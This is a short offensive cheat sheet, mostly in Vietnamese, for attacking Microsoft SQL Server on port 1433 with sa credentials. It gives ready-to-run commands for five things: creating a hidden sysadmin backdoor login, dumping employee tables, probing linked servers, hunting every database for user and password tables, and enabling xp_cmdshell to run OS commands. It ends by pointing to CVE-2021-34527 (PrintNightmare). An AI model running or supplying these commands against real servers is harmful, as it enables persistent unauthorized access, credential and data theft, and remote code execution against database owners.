# MSSQL 1433 CheatSheet

## UnCover DB  (sa:xxxxxxx)

### Tạo backdoor
```
CREATE LOGIN redteam_backdoor WITH PASSWORD = 'P@ssword123!';
sp_addsrvrolemember 'redteam_backdoor', 'sysadmin';
```
### Xem danh sách bảng trong DB
```
SELECT name FROM QLNV..sysobjects WHERE xtype = 'U';
```

### Đọc thông tin cột 

```
SELECT TOP 10 * FROM QLNV..NhanVien;
```
### Kiểm tra linksereer
```
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY([TEN_SERVER_KIA], 'SELECT system_user');
```


### Tìm thông tin dựa trên regex:
```
EXEC sp_msforeachdb 'USE [?]; SELECT ''?'' as DB_Name, name as Table_Name FROM sysobjects WHERE xtype = ''U'' AND (name LIKE ''%user%'' OR name LIKE ''%pass%'' OR name LIKE ''%account%'')';
```

## RCE xp_cmdshell
### Setup
```
-- Bước 1: Cho phép cấu hình nâng cao
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Bước 2: Bật xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Whoami
```
EXEC master..xp_cmdshell 'whoami';
```

## CVE 
### 2021
```
EXEC master..xp_cmdshell 'sc query spooler';
# Run là lụm CVE-2021-34527
```



